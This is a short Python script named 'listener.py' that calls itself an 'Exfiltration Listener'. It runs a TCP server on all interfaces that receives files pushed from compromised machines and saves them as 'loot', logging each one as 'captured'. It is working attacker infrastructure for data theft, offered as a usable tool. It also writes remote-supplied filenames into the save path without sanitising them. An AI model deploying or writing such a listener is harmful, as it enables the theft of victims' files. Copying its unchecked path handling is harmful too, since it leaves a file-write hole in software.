# listener.py (Renamed from server.py)
import socket
import struct
import os
import argparse

def start_server(host, port, save_dir):
    os.makedirs(save_dir, exist_ok=True)
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as server:
        server.bind((host, port))
        server.listen(5)
        print(f"[+] Listener active on {host}:{port}")
        print(f"[+] Saving loot to: {save_dir}")
        
        while True:
            conn, addr = server.accept()
            with conn:
                print(f"[!] Connection established from {addr[0]}")
                try:
                    # Receive filename length
                    raw_len = conn.recv(4)
                    if not raw_len: continue
                    name_len = struct.unpack('>I', raw_len)[0]
                    
                    # Receive filename
                    filename = conn.recv(name_len).decode()
                    
                    # Receive file size
                    file_size = struct.unpack('>Q', conn.recv(8))[0]
                    
                    save_path = os.path.join(save_dir, f"{addr[0]}_{filename}")
                    
                    # Receive data
                    with open(save_path, 'wb') as f:
                        remaining = file_size
                        while remaining > 0:
                            chunk = conn.recv(min(4096, remaining))
                            if not chunk: break
                            f.write(chunk)
                            remaining -= len(chunk)
                    print(f"[+] Successfully captured: {filename} ({file_size} bytes)")
                except Exception as e:
                    print(f"[-] Error receiving data: {e}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="Exfiltration Listener")
    parser.add_argument("--port", type=int, default=5001, help="Port to listen on")
    parser.add_argument("--dir", type=str, default="./loot", help="Directory to save files")
    args = parser.parse_args()
    
    start_server('0.0.0.0', args.port, args.dir)